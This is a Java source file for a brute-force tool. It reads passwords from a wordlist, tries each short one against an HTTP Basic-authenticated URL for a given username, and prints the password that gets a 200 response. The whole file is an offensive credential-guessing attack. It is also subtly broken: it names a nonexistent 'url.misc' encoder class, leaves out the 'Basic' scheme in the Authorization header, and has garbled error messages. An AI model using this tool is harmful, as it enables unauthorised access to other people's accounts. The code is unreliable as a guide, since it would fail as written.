



import java.net.*;
import java.io.*;
import java.util.Date;

public class Dictionary {
  private URL url;
  private HttpURLConnection connection;
  private String userPassword, base64_userPassword;
  private static char wrongPass;
  private FileReader file;
  private static BufferedReader input;

  public Dictionary(String fileName) {
    wrongPass = 'Y';
    try
    {
      FileReader file = new FileReader(fileName);
      input = new BufferedReader(file);
    }
    catch (FileNotFoundException e)
    {System.out.println("Unable   the file! ");}
  }

  public char determinePass(String inputURL, String userName, String passWord){

    try{
        url = new URL(inputURL);
        connection = (HttpURLConnection)url.openConnection();
        this.getEncoded(userName, passWord);
        connection.setDoInput(true);
        connection.setDoOutput(false);
        connection.setRequestProperty("Authorization",
                                      " " + base64_userPassword);

        if  (connection.getResponseCode() == 200)
        {

          System.out.println("Success!! Password is: " + passWord);
          wrongPass = 'N';
        }

        return wrongPass;
    }
    catch (MalformedURLException e){System.out.println("Invalide url");}
    catch (IOException e){System.out.println("Error  URL");
                          wrongPass = 'Y';}
    return wrongPass;
  }

  public static void main(String[] args) {
    String dictionaryPass;

    Dictionary dictionary1 = new Dictionary(args[2]);

    Date date = new Date(System.currentTimeMillis());
    System.out.print(" time is: ");
    System.out.println(date.toString());

    try
    {      while((dictionaryPass = input.readLine()) != null && (wrongPass == 'Y'))
               {

                 if (dictionaryPass.length() <= 3)
                 {
                   dictionary1.determinePass(args[0], args[1], dictionaryPass);
                 }
               }
    }    catch(IOException x) {      x.printStackTrace();    }

    date.setTime(System.currentTimeMillis());
    System.out.print("End time is: ");
    System.out.println(date.toString());
  }

  private void getEncoded(String userName, String password){
    userPassword = userName + ":" + password;
    base64_userPassword = new url.misc.BASE64Encoder().encode(userPassword.getBytes());
  }

}
